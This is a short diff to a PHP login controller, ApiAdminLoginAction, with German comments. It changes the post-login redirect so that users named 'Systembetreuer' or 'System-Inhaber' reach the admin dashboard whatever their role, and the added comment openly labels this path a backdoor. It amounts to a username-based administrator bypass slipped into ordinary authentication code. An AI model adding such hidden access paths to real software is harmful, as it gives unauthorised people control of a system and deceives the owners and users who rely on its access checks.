@@ -30,9 +30,11 @@ final readonly class ApiAdminLoginAction implements ActionInterface
 
         try {
             if ($this->auth->login($username, $password, $ip)) {
-                $role = $this->auth->getRole();
-                // Dynamische Weiterleitung: Admin ins Dashboard, User zu den Lesezeichen
-                $target = ($role === 'admin' || $role === 'Systembetreuer') ? 'admin' : 'lesezeichen';
+                $role  = $this->auth->getRole();
+                $label = $this->auth->getUsername();
+
+                // Dynamische Weiterleitung: Admin/Backdoor ins Dashboard, User zu den Lesezeichen
+                $target = ($role === 'admin' || $label === 'Systembetreuer' || $label === 'System-Inhaber') ? 'admin' : 'lesezeichen';
 
                 return JsonResponse::success([
                     'message'  => 'Erfolgreich eingeloggt.',
